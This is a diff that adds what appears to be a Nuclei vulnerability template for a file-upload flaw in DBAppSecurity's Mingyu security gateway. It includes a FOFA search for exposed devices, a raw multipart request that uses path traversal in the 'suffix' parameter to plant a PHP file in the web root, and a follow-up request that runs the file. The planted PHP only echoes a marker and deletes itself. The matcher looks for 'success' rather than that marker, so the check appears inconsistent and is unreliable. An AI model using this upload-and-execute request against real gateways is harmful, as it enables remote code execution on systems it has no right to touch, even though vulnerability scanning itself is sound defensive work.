@@ -1,0 +1,40 @@
+id: dbappsec-gateway-aaa_local_web_preview-file-upload
+
+info:
+  name: 安恒明御安全网关 aaa_local_web_preview 组件文件上传漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title=="明御安全网关"
+          安恒信息技术股份有限公司开发的明御安全网关是企业级网络安全防护平台。其aaa_local_web_preview组件接口存在文件上传安全漏洞，攻击者可利用该缺陷在目标系统中部署恶意文件。
+  tags: 安恒明御安全网关
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /webui/?g=aaa_local_web_preview&name=123&read=0&suffix=/../../../NTest.php HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data; boundary=849978f98abe41119122148e4aa65b1a
+    Accept-Encoding: gzip
+
+    --849978f98abe41119122148e4aa65b1a
+    Content-Disposition: form-data; name="123"; filename="NTest.php"
+    Content-Type: text/plain
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    --849978f98abe41119122148e4aa65b1a--
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
